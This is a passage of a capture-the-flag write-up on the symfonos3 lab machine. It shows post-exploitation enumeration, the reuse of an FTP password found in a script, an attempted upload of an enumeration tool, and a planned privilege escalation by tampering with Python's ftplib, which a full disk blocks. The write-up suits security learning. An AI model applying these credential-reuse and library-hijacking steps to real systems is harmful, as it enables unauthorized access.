+cerberus  9701  0.0  0.3 489392 13600 ?        S    05:06   0:00 /usr/sbin/apache2 -k start
+cerberus  9702  0.0  0.3 489392 13600 ?        S    05:06   0:00 /usr/sbin/apache2 -k start
+cerberus  9703  0.0  0.3 489392 13600 ?        S    05:06   0:00 /usr/sbin/apache2 -k start
+cerberus  9704  0.0  0.3 489392 13580 ?        S    05:06   0:00 /usr/sbin/apache2 -k start
+cerberus  9705  0.0  0.3 489392 13580 ?        S    05:06   0:00 /usr/sbin/apache2 -k start
+cerberus  9706  0.0  0.3 489392 13580 ?        S    05:06   0:00 /usr/sbin/apache2 -k start
+cerberus  9707  0.0  0.3 489392 13592 ?        S    05:06   0:00 /usr/sbin/apache2 -k start
+root     10048  0.0  0.1  99352  6768 ?        Ss   05:30   0:00 sshd: hades [priv]
+hades    10050  0.0  0.1  64832  6364 ?        Ss   05:30   0:00 /lib/systemd/systemd --user
+hades    10051  0.0  0.0 166352  1532 ?        S    05:30   0:00 (sd-pam)
+hades    10057  0.0  0.0  99352  3908 ?        S    05:30   0:00 sshd: hades@pts/0
+hades    10058  0.0  0.1  21008  4824 pts/0    Ss   05:30   0:00 -bash
+root     10119  0.0  0.0      0     0 ?        S    05:35   0:00 [kworker/u2:0]
+root     10237  0.0  0.0      0     0 ?        S    05:39   0:00 [kworker/0:1]
+root     10323  0.0  0.0      0     0 ?        S    05:49   0:00 [kworker/u2:2]
+hades    10332  0.0  0.0  38304  3308 pts/0    R+   05:49   0:00 ps aux
+hades@symfonos3:~$
+</code></pre>
+<p>I don’t see anything.</p>
+<h3 id="section-1">/</h3>
+<pre class="shell"><code>hades@symfonos3:/$ ls -lt
+total 76
+drwxrwxrwt  9 root root  4096 Jan  8 05:51 tmp
+dr-xr-xr-x 13 root root     0 Jan  8 05:50 sys
+drwxr-xr-x 19 root root   680 Jan  8 05:30 run
+drwxr-xr-x 17 root root  2900 Jan  8 05:27 dev
+dr-xr-xr-x 89 root root     0 Jan  7 22:12 proc
+drwx------  4 root root  4096 Apr  6  2020 root
+drwxr-xr-x 88 root root  4096 Apr  6  2020 etc
+drwxr-xr-x  3 root root  4096 Apr  6  2020 boot
+drwxr-xr-x  2 root root  4096 Apr  6  2020 sbin
+drwxr-xr-x  3 root root  4096 Jul 20  2019 opt
+drwxr-xr-x  3 root root  4096 Jul 20  2019 srv
+drwxr-xr-x  2 root root  4096 Jul 20  2019 bin
+drwxr-xr-x  4 root root  4096 Jul 20  2019 home
+drwxr-xr-x 12 root root  4096 Jul 19  2019 var
+drwxr-xr-x 14 root root  4096 Jul 19  2019 lib
+lrwxrwxrwx  1 root root    29 Jul 19  2019 initrd.img -&gt; boot/initrd.img-4.9.0-9-amd64
+lrwxrwxrwx  1 root root    29 Jul 19  2019 initrd.img.old -&gt; boot/initrd.img-4.9.0-9-amd64
+lrwxrwxrwx  1 root root    26 Jul 19  2019 vmlinuz -&gt; boot/vmlinuz-4.9.0-9-amd64
+lrwxrwxrwx  1 root root    26 Jul 19  2019 vmlinuz.old -&gt; boot/vmlinuz-4.9.0-9-amd64
+drwxr-xr-x  2 root root  4096 Jul 19  2019 lib64
+drwxr-xr-x 10 root root  4096 Jul 19  2019 usr
+drwxr-xr-x  2 root root  4096 Jul 19  2019 mnt
+drwxr-xr-x  3 root root  4096 Jul 19  2019 media
+drwx------  2 root root 16384 Jul 19  2019 lost+found
+</code></pre>
+<figure>
+<img src="13.filesystem.png" alt="" /><figcaption>13.filesystem</figcaption>
+</figure>
+<pre class="shell"><code>hades@symfonos3:/$ ls -lAh {tmp,opt,var,mnt,media}
+media:
+total 4.0K
+lrwxrwxrwx 1 root root    6 Jul 19  2019 cdrom -&gt; cdrom0
+drwxr-xr-x 2 root root 4.0K Jul 19  2019 cdrom0
+
+mnt:
+total 0
+
+opt:
+total 4.0K
+drwxr-x--- 2 root hades 4.0K Apr  6  2020 ftpclient
+
+tmp:
+total 28K
+drwxrwxrwt 2 root root 4.0K Jan  8 03:42 .font-unix
+drwxrwxrwt 2 root root 4.0K Jan  8 03:42 .ICE-unix
+drwx------ 3 root root 4.0K Jan  8 03:42 systemd-private-ec7868dfb60649b0bb6ba410012fdedd-apache2.service-3dWiia
+drwx------ 3 root root 4.0K Jan  8 03:42 systemd-private-ec7868dfb60649b0bb6ba410012fdedd-systemd-timesyncd.service-U68ceA
+drwxrwxrwt 2 root root 4.0K Jan  8 03:42 .Test-unix
+drwxrwxrwt 2 root root 4.0K Jan  8 03:42 .X11-unix
+drwxrwxrwt 2 root root 4.0K Jan  8 03:42 .XIM-unix
+
+var:
+total 40K
+drwxr-xr-x  2 root root  4.0K Jan  6 06:30 backups
+drwxr-xr-x  9 root root  4.0K Jul 20  2019 cache
+drwxr-xr-x 32 root root  4.0K Jul 20  2019 lib
+drwxrwsr-x  2 root staff 4.0K Mar 28  2019 local
+lrwxrwxrwx  1 root root     9 Jul 19  2019 lock -&gt; /run/lock
+drwxr-xr-x  8 root root  4.0K Jan  6 08:04 log
+drwxrwsr-x  2 root mail  4.0K Jan  6 07:22 mail
+drwxr-xr-x  2 root root  4.0K Jul 19  2019 opt
+lrwxrwxrwx  1 root root     4 Jul 19  2019 run -&gt; /run
+drwxr-xr-x  5 root root  4.0K Jul 19  2019 spool
+drwxrwxrwt 14 root root  4.0K Jan  8 05:39 tmp
+drwxr-xr-x  3 root root  4.0K Jul 19  2019 www</code></pre>
+<p>We find /opt/ftpclient.</p>
+<h3 id="optftpclient">/opt/ftpclient</h3>
+<pre class="shell"><code>hades@symfonos3:/$ ls -lA /opt/ftpclient
+total 8
+-rw-r--r-- 1 root hades 262 Apr  6  2020 ftpclient.py
+-rw-r--r-- 1 root hades 251 Jan  8 05:55 statuscheck.txt</code></pre>
+<h4 id="ftpclient.py">ftpclient.py</h4>
+<div class="sourceCode" id="cb78"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb78-1"><a href="#cb78-1" aria-hidden="true"></a><span class="im">import</span> ftplib</span>
+<span id="cb78-2"><a href="#cb78-2" aria-hidden="true"></a></span>
+<span id="cb78-3"><a href="#cb78-3" aria-hidden="true"></a>ftp <span class="op">=</span> ftplib.FTP(<span class="st">&#39;127.0.0.1&#39;</span>)</span>
+<span id="cb78-4"><a href="#cb78-4" aria-hidden="true"></a>ftp.login(user<span class="op">=</span><span class="st">&#39;hades&#39;</span>, passwd<span class="op">=</span><span class="st">&#39;PTpZTfU4vxgzvRBE&#39;</span>)</span>
+<span id="cb78-5"><a href="#cb78-5" aria-hidden="true"></a></span>
+<span id="cb78-6"><a href="#cb78-6" aria-hidden="true"></a>ftp.cwd(<span class="st">&#39;/srv/ftp/&#39;</span>)</span>
+<span id="cb78-7"><a href="#cb78-7" aria-hidden="true"></a></span>
+<span id="cb78-8"><a href="#cb78-8" aria-hidden="true"></a><span class="kw">def</span> upload():</span>
+<span id="cb78-9"><a href="#cb78-9" aria-hidden="true"></a>    filename <span class="op">=</span> <span class="st">&#39;/opt/client/statuscheck.txt&#39;</span></span>
+<span id="cb78-10"><a href="#cb78-10" aria-hidden="true"></a>    ftp.storbinary(<span class="st">&#39;STOR &#39;</span><span class="op">+</span>filename, <span class="bu">open</span>(filename, <span class="st">&#39;rb&#39;</span>))</span>
+<span id="cb78-11"><a href="#cb78-11" aria-hidden="true"></a>    ftp.quit()</span>
+<span id="cb78-12"><a href="#cb78-12" aria-hidden="true"></a></span>
+<span id="cb78-13"><a href="#cb78-13" aria-hidden="true"></a>upload()</span></code></pre></div>
+<h4 id="statuscheck.txt">statuscheck.txt</h4>
+<pre class="shell"><code>HTTP/1.1 200 OK
+Date: Sat, 08 Jan 2022 11:56:01 GMT
+Server: Apache/2.4.25 (Debian)
+Last-Modified: Sat, 20 Jul 2019 05:19:54 GMT
+ETag: &quot;f1-58e15fe4052c8&quot;
+Accept-Ranges: bytes
+Content-Length: 241
+Vary: Accept-Encoding
+Content-Type: text/html
+</code></pre>
+<h2 id="ftp-1">FTP</h2>
+<pre class="shell"><code>ftp $RHOST 21
+Connected to 192.168.56.92.
+220 ProFTPD 1.3.5b Server (Debian) [::ffff:192.168.56.92]
+Name (192.168.56.92:f0c1s): hades
+331 Password required for hades
+Password:
+230 User hades logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+229 Entering Extended Passive Mode (|||15895|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 hades    hades        4096 Jan  8 11:32 .
+drwxr-xr-x   4 root     root         4096 Jul 20  2019 ..
+lrwxrwxrwx   1 root     root            9 Jul 20  2019 .bash_history -&gt; /dev/null
+-rw-r--r--   1 hades    hades         220 Jul 20  2019 .bash_logout
+-rw-r--r--   1 hades    hades        3526 Jul 20  2019 .bashrc
+-rw-r--r--   1 hades    hades           0 Jan  8 11:31 lse.sh
+-rw-r--r--   1 hades    hades           0 Jan  8 11:32 lse.sh.1
+drwxr-xr-x   2 hades    hades        4096 Jul 20  2019 .nano
+-rw-r--r--   1 hades    hades         675 Jul 20  2019 .profile
+-rw-r--r--   1 hades    hades         165 Apr  6  2020 .wget-hsts
+226 Transfer complete
+ftp&gt; cd /srv
+250 CWD command successful
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||58599|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   2 hades    hades        4096 Jul 20  2019 ftp
+226 Transfer complete
+ftp&gt; cd ftp
+250 CWD command successful
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||21173|)
+150 Opening ASCII mode data connection for file list
+-rw-r--r--   1 hades    hades         251 Jul 20  2019 statuscheck.txt
+226 Transfer complete
+ftp&gt; put fping.txt
+local: fping.txt remote: fping.txt
+ftp: Can&#39;t open `fping.txt&#39;: No such file or directory
+ftp&gt; put lse.sh
+local: lse.sh remote: lse.sh
+229 Entering Extended Passive Mode (|||52659|)
+150 Opening BINARY mode data connection for lse.sh
+100% |**********************************************************************| 43570       26.84 MiB/s    00:00 ETA
+452 Transfer aborted. No space left on device
+43570 bytes sent in 00:00 (11.81 MiB/s)
+ftp&gt; exit
+221 Goodbye.
+</code></pre>
+<p>I used the credentials to login. Then, reached /srv/ftp and thought can I push files from here? Maybe it was an access issue.</p>
+<p>But no, cannot upload lse.sh from ftp. No space strikes again.</p>
+<h3 id="attack-via-python">Attack via python</h3>
+<p>Back to attacking via python. The file is using <code>ftplib</code>, can we abuse this relationship?</p>
+<pre class="shell"><code>hades@symfonos3:/opt/ftpclient$ find / -name &quot;ftplib*&quot; 2&gt;/dev/null
+/usr/lib/python2.7/ftplib.pyc
+/usr/lib/python2.7/ftplib.py
+/usr/lib/python3.5/__pycache__/ftplib.cpython-35.pyc
+/usr/lib/python3.5/ftplib.py</code></pre>
+<p>Cannot save the file because there is no space.</p>
+<figure>
+<img src="14.wait-is-the-virtual-disk-full-NOPE.png" alt="" /><figcaption>14.wait-is-the-virtual-disk-full-NOPE</figcaption>
+</figure>
+<h2 id="stuck-in-disk-full-jail">Stuck in disk-full jail</h2>
+<h3 id="cannot-copy-wget">cannot copy, wget</h3>
+<figure>
+<img src="15.stuck-in-disk-full-jail.png" alt="" /><figcaption>15.stuck-in-disk-full-jail</figcaption>
+</figure>
+<pre class="shell"><code>hades@symfonos3:~$ cp /usr/lib/python2.7/ftplib.py ./
+hades@symfonos3:~$ ls -la
+total 28
+drwxr-xr-x 3 hades hades 4096 Jan  8 06:17 .
+drwxr-xr-x 4 root  root  4096 Jul 20  2019 ..
+lrwxrwxrwx 1 root  root     9 Jul 20  2019 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 hades hades  220 Jul 19  2019 .bash_logout
+-rw-r--r-- 1 hades hades 3526 Jul 19  2019 .bashrc
+-rwxr--r-- 1 hades hades    0 Jan  8 06:17 ftplib.py
+-rw-r--r-- 1 hades hades    0 Jan  8 05:31 lse.sh
+-rw-r--r-- 1 hades hades    0 Jan  8 05:32 lse.sh.1
+drwxr-xr-x 2 hades hades 4096 Jul 20  2019 .nano
+-rw-r--r-- 1 hades hades  675 Jul 19  2019 .profile
+-rw-r--r-- 1 hades hades  165 Apr  6  2020 .wget-hsts
+</code></pre>
+<p>Notice the zeroes.</p>
+<h3 id="cannot-nano">cannot nano</h3>
+<figure>
+<img src="16.nano-cannot-read-file.png" alt="" /><figcaption>16.nano-cannot-read-file</figcaption>
+</figure>
+<figure>
+<img src="17.python-3-5-has-it.png" alt="" /><figcaption>17.python-3-5-has-it</figcaption>
+</figure>
+<figure>
+<img src="18.permission-denied.png" alt="" /><figcaption>18.permission-denied</figcaption>
+</figure>
+<figure>
+<img src="19.tried-writing-to-other-location-but-no-space.png" alt="" /><figcaption>19.tried-writing-to-other-location-but-no-space</figcaption>
+</figure>
+<h2 id="to-be-continued">to be continued…</h2>
 </body>
 </html>
